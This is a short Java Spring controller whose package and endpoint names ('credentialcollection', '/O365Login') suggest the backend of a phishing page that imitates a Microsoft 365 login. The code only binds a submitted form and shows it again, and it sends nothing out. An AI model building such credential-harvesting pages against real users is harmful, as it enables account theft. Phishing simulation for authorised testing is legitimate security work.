package com.example.credentialcollection;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;

@Controller
public class CredentialController {

    @GetMapping("/TargetHost/target")
    public String getCredentials(Model model) {
        model.addAttribute("credentials", new TargetHost());
        return "credentials";
    }

    @PostMapping("/O365Login")
    public String postCredentials(@ModelAttribute TargetHost target, Model model) {
        model.addAttribute("target", target);
        return "target";
    }
}
